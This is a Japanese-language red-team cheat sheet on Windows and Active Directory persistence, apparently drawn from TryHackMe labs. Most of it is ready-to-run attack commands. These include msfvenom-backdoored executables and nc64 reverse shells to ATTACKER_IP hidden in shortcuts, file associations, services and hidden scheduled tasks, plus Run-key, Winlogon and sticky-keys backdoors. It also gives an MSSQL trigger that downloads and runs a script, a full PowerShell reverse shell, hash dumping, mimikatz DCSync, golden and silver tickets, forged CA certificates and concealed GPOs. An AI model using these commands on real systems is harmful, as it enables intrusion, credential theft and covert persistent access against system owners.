# 永続化（Windows）

永続化とは、疑惑を持たれずにできるだけ長い間検出されずにシステムにバックドアを仕掛ける技術。

## グループ

```ps
# ユーザーを管理者グループに入れる
net localgroup administrators <user> /add

# バックアップ操作グループに入れる。WinRMも付与
net localgroup "Backup Operators" <user> /add
net localgroup "Remote Management Users" <user> /add

# リモート接続時にUACによって管理者権限をはく奪される機能を無効にする
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

## 権限

```ps
# 現在の権限を一時ファイルにエクスポート
secedit /export /cfg config.inf

# 権限の場所にユーザーを追加し、ファイル保存
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,thmuser2
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,thmuser2

# 変換、インポート
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```

## ハッシュダンプ

```ps
# SAM ファイルと SYSTEM ファイルのバックアップを作成
reg save hklm\system system.bak
reg save hklm\sam sam.bak

# ダウンロード（Evil-WinRM）
download system.bak
download sam.bak

# パスワードハッシュのダンプ
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# Pass-the-Hash でログイン
evil-winrm -i <ip> -u <user> -H <hashvalue>
```

### リモート接続セキュリティ記述子の構成ウィンドウを開く

```ps
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

## RID

```ps
# 任意のユーザーのRIDを確認（最後の数値がRID）
# 管理者のデフォルトは500。一般ユーザーは1000以降。
wmic useraccount get name,sid
```

psexec（sysinternals）でレジストリを開く

```ps
PsExec64.exe -i -s regedit
```

```text
HKLM\SAM\SAM\Domains\Account\Users\

RID値のエントリ中に「F」という値があり、位置0x30にRIDが保持されている。
その部分を、500(0x01F4)に書き換える。（F4, 01 の順）
```

この状態でログインすると、管理者のデスクトップが表示される。

## バックドア

本来の機能を維持したままリバースシェルを仕込む

### 実行ファイル

任意の exe ファイルにペイロードを埋め込む

```shell
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

### ショートカット

スクリプトを用意

```ps
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

ショートカットのターゲット設定。ウインドウが表示されないように。  
また、アイコンの見た目はプロパティ、ショートカットから変更可能。

```ps
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

### ファイル関連付け

```text
HKLM\Software\Classes\
に拡張子ごとのエントリがあり、そのデフォルト値はプログラムIDを意味する。
例えば、
HKLM\Software\Classes\.txt には「txtfile」というプログラムIDが入っている。

HKLM\Software\Classes\txtfile\shell\open\command
の中に、関連付けられたプログラムの参照が設定されている。

%SystemRoot%\system32\NOTEPAD.EXE %1
```

スクリプトを用意

```ps
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

レジストリ値を下記のように書き換える

```text
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor2.ps1 %1
```

## サービス

### サービス作成

ペイロードの作成

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

サービスの作成、開始

```ps
sc.exe create <servicename> binPath= "C:\Windows\System32\rev-svc.exe" start= auto
sc.exe start <servicename>
```

### 既存サービスの利用

利用可能なサービス一覧

```ps
sc.exe query state=all
```

サービス変更

```ps
sc.exe config <servicename> binPath= "C:\Windows\System32\rev-svc2.exe" start= auto obj= "LocalSystem"

sc.exe qc <servicename>
```

## タスクスケジューラ

```ps
# タスクの作成（1分ごとに起動する設定）
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM

# 正常に作成されたか確認
schtasks /query /tn thm-taskbackdoor
```

### セキュリティ記述子の削除

System 権限で PsExec を開く

```shell
PsExec64.exe -s -i regedit
```

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\

タスクの SD値 をDeleteする。
```

これで、管理者含め全てのユーザーからタスクが見えなくなる。

## ログオントリガー

### スタートアップ

```text
# ユーザーごと
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# 全ユーザー
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

### 実行／一度だけ実行

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

（名前）任意
（Type）REG_EXPAND_SZ
（Data）c:\Windows\revshell.exe
```

### Winlogon

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\

Userinit: C:\Windows\System32\userinit.exe,
Shell: explorer.exe

次のように変更する。
Userinit: C:\Windows\System32\userinit.exe, C:\Windows\revshell.exe
```

### ログオンスクリプト

この環境変数は HKLM に相当するものが無いので、ユーザーごとに設定する必要がある。

```text
HKCU\Environment

（名前）UserInitMprLogonScript
（Type）REG_EXPAND_SZ
（Data）c:\Windows\revshell.exe
```

## ログオン画面

### スティッキーキー

Shift を 5 回押すことで、スティッキーキーをアクティブ化できる。そのとき、  
C:\Windows\System32\sethc.exe  
が実行される。  
これを cmd.exe に置き換えることで、認証前のログイン画面の状態でも、Shift キーを 5 回押すことでシェルを取得できる。

```ps
# 所有権を取得
takeown /f c:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
# 置き換え
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

### Utilman

ロック画面中の簡単操作オプションを提供するアプリケーション。  
スティッキーキーと同様、cmd.exe で置き換える。

```ps
takeown /f c:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

ロック画面で簡単操作ボタンを押すだけでシェルを取得できる。

## コンポーネント オブジェクト モデル ハイジャック

https://tryhackme.com/room/apt28inceptiontheory

Windows COM レジストリデータベースには、すべての COM オブジェクトのマッピング情報が含まれており、システムはこれを利用してディスク上の COM オブジェクトを検索し、読み込む。APT28 などの攻撃者は、レジストリ内のクラス ID（CLSID）エントリを操作し、正規の COM オブジェクトをリダイレクトして悪意のあるバイナリを実行させる。

この攻撃によく関連する 2 つのレジストリの場所は次のとおり。

- HKEY_CLASSES_ROOT\CLSID
- HKEY_CLASSES_ROOT\WOW6432Node\CLSID

これらのキーには、特定の COM クラスを表すグローバル一意識別子（GUID）である CLSID が格納される。例えば、CLSID {71A24DD5-P61A-448B-8C32-13424B88AFB8} は、システム内の正規の COM オブジェクトにマッピングされる。しかし、APT28 はこれらのエントリを改ざんし、悪意のあるバイナリを参照するようにする。例えば、次のようになる。

- HKEY_CLASSES_ROOT\CLSID{79ECA078-17FF-726B-E811-213280E5C831}
- HKEY_CLASSES_ROOT\WOW6432Node\CLSID{79FEACFF-FFCE-815E-A900-316290B5B73

このような場合、APT28 はこれらの CLSID の値を変更することで、システムまたはアプリケーションがこれらのオブジェクトを呼び出したときに独自のマルウェアを実行し、悪意のあるペイロードを自動的に実行することができる。

## Office アプリケーションの起動: Office テスト

https://tryhackme.com/room/apt28inceptiontheory

APT28 は、Microsoft Office アプリケーションを標的とした永続化手法を採用しており、具体的にはレジストリキーパス HKCU\Software\Microsoft\Office test\Special\Perf を利用している。この手法により、Word などの Office アプリケーションが起動するたびに悪意のある DLL が読み込まれ、攻撃者がアクセスを維持できるようになる。

APT28 による最近の標的型攻撃では、前述のレジストリキーを作成する配信文書が使用され、Microsoft Office アプリケーションが開かれるたびに悪意のある DLL が読み込まれた。

### 攻撃の仕組み

1. レジストリキーの作成：この文書は、HKCU\Software\Microsoft\Office test\Special\Perf というキーを作成すｒ。このキーは Microsoft Office のデフォルトのインストールには存在しないため、攻撃者がマルウェアを侵入しやすくなる。
2. DLL の読み込み：ユーザーが Microsoft Word 文書を開くと、Word の正規のプロセスである wwlib.dll がこのキーを照会し、文書内で参照されている DLL を読み込む。悪意のある DLL は LoadLibraryW を使用して読み込まれ、Word や他の Office アプリケーションが起動するたびに攻撃者のコードが実行される可能性がある。
3. マルウェア実行：Fancy Bear 攻撃では、この APT はキー内にローダー型トロイの木馬 btecache.dll を配置し、 C:\ProgramData から svchost.dll をロードした。この 2 つ目の DLL には、Office アプリケーションが開いている間に実行される実際のペイロードが含まれていた。

APT28 はキーを HKCU に配置する。HKCU では、キーの変更には一般ユーザー権限のみが必要であり、HKLM ハイブで必要となる管理者アクセスを回避できる。悪意のある DLL は正規の Office アプリケーションプロセスによって読み込まれるため、この手法では悪意のあるアクティビティが通常の操作に紛れ込み、検出が困難になる。

## その他サービス

あくまで一例。

### ASP.NET Web シェル

適当な Web シェルをサーバーに保存する

https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx

```ps
move shell.aspx C:\inetpub\wwwroot\
icacls C:\inetpub\wwwroot\shell.aspx /grant Everyone:F
```

http://10.10.3.240/shell.aspx  
のような形でブラウザ空コマンドを実行できる。

### MSSQL トリガー

あるテーブルに INSERT したときのトリガーとして Powershell スクリプトを実行する。

Microsoft SQL Server Management Studio 18 の場合、「新しいクエリ」で次の SQL を実行。

xp_cmdshell を有効化。

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

全てのユーザーに sa ユーザー（デフォルトの DB 管理者）を偽装する権限を付与

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

HRDB.dbo.Employees テーブルに INSERT されるたびにトリガーさせる。

```sql
USE HRDB
```

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

evilscript.ps1

```ps
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

## DC-sync

全員分のダンプを出力

```shell
mimikatz # log <logname>.txt
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

```shell
# ユーザー名
cat <logname>.txt | grep "SAM Username"

# ハッシュ
cat <logname>.txt | grep "Hash NTLM"
```

ハッシュはオフラインパスワードクラックするか、PassTheHash 攻撃に使える。

## ゴールデンチケット、シルバーチケット

### ゴールデンチケット

ゴールデンチケットは偽造された TGT。偽造するには、krbtgt アカウントの NTLM ハッシュが必要。特権アカウントの有効な TGT があれば、ほぼすべてのサービスの TGS を要求可能になる。

- ゴールデンチケットがあれば、偽装するアカウントの NTLM ハッシュは不要。
- krbtgt ハッシュ以外に必要なのは、偽装するアカウントのドメイン名、ドメイン SID、ユーザー ID。
- 削除された、無効化された、存在しないアカウントを指定しても、タイムスタンプが 20 分以内であれば有効になる。
- チケットのポリシーとルールは TGT 自体に設定されるため、TGT が 10 年間有効といった設定にして永続化することが可能。
- デフォルトでは krbtgt アカウントのパスワードは変更されない。手動で変更されない限り、TGT を生成することで永続的にアクセス可能。
- ブルーチームが krbtgt アカウントのパスワードを変更する場合、2 回変更する必要がある。1 回前のパスワードは有効なものとして保持される仕様。
- krbtgt アカウントのパスワードをローテーションすることは簡単ではない。タイムスタンプが有効な場合、新しい TGT を自動要求しないシステムもあるため。
- ゴールデン チケットを使用すると、 TGT を作成する前に DC によってスマート カードが検証されるため、スマート カード認証をバイパスすることもできる。
- ドメインに参加していないマシンでもゴールデンチケットを生成できるため、ブルーチームによる検出が困難になる。

```ps
# KRBTGT アカウントのハッシュをダンプ
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt

Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
    LM   :

# （参考）他の方法。DCに直接ログインできない場合も使える。ただしドメインレプリケーション権限が必要。
mimikatz # lsadump::dcsync /user:krbtgt
```

```ps
# ドメインSIDの取得
Get-ADDomain
```

```shell
# ゴールデンチケット生成
# デフォルトの管理者アカウント RID は 500。デフォルトも500。

mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```

### シルバーチケット

シルバーチケットは偽造された TGS チケット。アクセスしたいサービスと直接インターフェイスする。

- 生成された TGS は、ターゲットとするホストのマシンアカウントによって署名される。
- ゴールデンチケットとシルバーチケットの主な違いは、取得できる権限の数。KRBTGT アカウントのパスワードハッシュがあれば、すべてにアクセスできる。シルバーチケットでは、攻撃対象のサーバーのマシンアカウントのパスワードハッシュにしかアクセスできないため、そのホスト自体のユーザーになりすますことしかできない。シルバーチケットのスコープは、特定のサーバーでターゲットにされているサービスに限定される。
- TGS は偽造されているため、関連する TGT はなく、DC にはアクセスされていないことを意味する。利用可能なログはターゲットサーバー上のものだけ。そのため、範囲は限定されるが、ブルーチームによる検出は大幅に困難になる。
- 権限は SID によって決定されるため、チケットにユーザーをホストのローカル管理者グループに配置する関連 SID が含まれている限り、シルバーチケットに存在しないユーザーを再度作成できる。
- マシンアカウントのパスワードは通常 30 日ごとにローテーションされるが、これは永続性には適していない。ただし、TGS が提供するアクセスを利用してホストのレジストリにアクセスし、マシンアカウントのパスワードローテーションを担うパラメータを変更することができる。これにより、マシンアカウントが静的のままになり、マシン上で永続性が付与される。
- 単一のホストにしかアクセスできないが、マシンアカウントは通常の AD アカウントとして使用できるため、ホストへの管理アクセスだけでなく、 AD ユーザーアカウントの場合と同様に AD を列挙および活用し続ける手段も得られる。

```shell
# シルバーチケット生成
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```

# 注意

# ここより下の全内容は、回復不可能になる可能性が高いので、レッドチームで契約上の許可があったとしても、基本的に「実行してはいけない」類のもの。

## 証明書

（注意）この証明書を除去するにはルート CA 証明書を取り消すしか方法がなくなる。

### CA の秘密鍵抽出

CA サーバーでエクスポート

```shell
# CA証明書があるか確認
mimikatz # crypto::certificates /systemstore:local_machine

# メモリにパッチして、エクスポート不可のキーをエクスポート可能にする
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
"KeyIso" service patched

# エクスポート。エクスポートされた証明書は、PFX 形式と DER 形式の両方でディスクに保存される。
# デフォルトで、mimikatz というパスワードで暗号化される。
mimikatz # crypto::certificates /systemstore:local_machine /export
```

証明書生成

```shell
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

https://github.com/GhostPack/ForgeCert

- CaCertPath - エクスポートされた CA 証明書へのパス。
- CaCertPassword - 証明書を暗号化するために使用されるパスワード。
- Subject - 証明書の件名または共通名。
- SubjectAltName - この証明書を使用して偽装するアカウントのユーザープリンシパル名 (UPN)。正当なユーザーである必要がある。
- NewCertPath - ForgeCert が生成された証明書を保存する場所へのパス。
- NewCertPassword - 証明書には認証のためにエクスポートされた秘密鍵が必要なので、それを暗号化するために使用する新しいパスワードを設定する必要がある。

TGT 取得

```shell
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
```

TGT ロード

```shell
mimikatz # kerberos::ptt administrator.kirbi
```

## SID 履歴

- ドメイン管理者権限またはそれと同等の権限が必要。
- アカウントがログオンイベントを作成すると、アカウントに関連付けられた SID がユーザーのトークンに追加され、アカウントに関連付けられた権限が決定される。これにはグループ SID も含まれる。
- Enterprise Admin SID を挿入すると、アカウントの権限がフォレスト内のすべてのドメインで実質的にドメイン管理者に昇格される。
- SID はユーザーのトークンに追加されるため、アカウントが実際のグループのメンバーでなくても権限は尊重される。

```ps
# 現在のSID履歴を確認
Get-ADUser <your ad username> -properties sidhistory,memberof

# Domain AdminsグループのSIDを取得
Get-ADGroup "Domain Admins"

# DSInternals を使ってSID 履歴にパッチを適用
# ntds.ditは、全ての情報が保存されているADデータベース。
Stop-Service -Name ntds -force
Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service -Name ntds
```

https://github.com/MichaelGrafnetter/DSInternals

## グループメンバーシップ

アラートを発生させる特権グループに自分自身を追加するのではなく、監視されていないサブグループに追加する。

```ps
# People->IT OU に非表示にする新しい基本グループを作成
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Nest Group 1" -SamAccountName "nestgroup1" -DisplayName "Nest Group 1" -GroupScope Global -GroupCategory Security

# People->Sales OUに別のグループを作成し、以前のグループをメンバーとして追加
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Nest Group 2" -SamAccountName "nestgroup2" -DisplayName "Nest Group 2" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "nestgroup2" -Members "nestgroup1"

# 同様に何層にもネストしていく
New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Nest Group 3" -SamAccountName "nestgroup3" -DisplayName "Nest Group 3" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"
```

```ps
# 最後のグループをドメイン管理者グループに追加
Add-ADGroupMember -Identity "Domain Admins" -Members "nestgroup5"

# 最初のグループに権限の低いADユーザーを追加
Add-ADGroupMember -Identity "nestgroup1" -Members "<low privileged username>"
```

## AD グループテンプレート

SDProp プロセスは、AdminSDHolder コンテナの ACL を取得し、60 分ごとにすべての保護されたグループに適用する。これにより、すべての保護されたグループに対する完全な権限を付与する ACE を作成できる。

```ps
# 権限の低いユーザーでRDP接続し、管理者としてプロンプトを開く
runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe

# 新しく表示された管理者プロンプトでMS管理コンソールを起動
mmc
```

- [ファイル] -> [スナップインの追加] -> [Active Directory ユーザーとコンピューター]
- 右クリック -> [表示] -> [高度な機能]
- [ドメイン] -> [システム] の下に AdminSDHolder グループ
- 右クリック > プロパティ > セキュリティ
- 権限の低いユーザーを追加し、フルコントロールを付ける
- 最大 60 分で、SDProp により管理者権限が付与される

## グループポリシーオブジェクト（GPO）

- [ファイル] -> [スナップインの追加] -> [グループポリシー管理]
- Admins OU を右クリック -> [ドメインに GPO を作成] -> ここにリンクするを選択
- ポリシーを右クリックして「適用」
- 編集からログオンスクリプトなどを設定できる

### 隠す

- ポリシーを選択して「委任（Delegation）」を選択
- ENTERPRISE DOMAIN CONTROLLERS を右クリックし、設定の編集、削除、セキュリティの変更を選択
- 他のすべてのグループ（Authenticated User を除く）をクリックし、 [削除]をクリック
- 先に進み、権限から「Created Owner」を削除

ログオンスクリプトがある場合は、Authenticated User に Read 権限を付けておく必要がある。

ログオンスクリプトがない場合、認証済みユーザーをドメイン コンピューターに置き換えることで、コンピューターが引き続きポリシーを読み取って適用できるようにしつつ、ユーザーがポリシーを読み取れないようにすることができる。

「Domain Computers」を追加し「Authenticated User」を削除すると、ドメイン コントローラーのマシンアカウントを偽装しない限り、GPO を削除できなくなる。※一度やると自分でも元に戻せない。
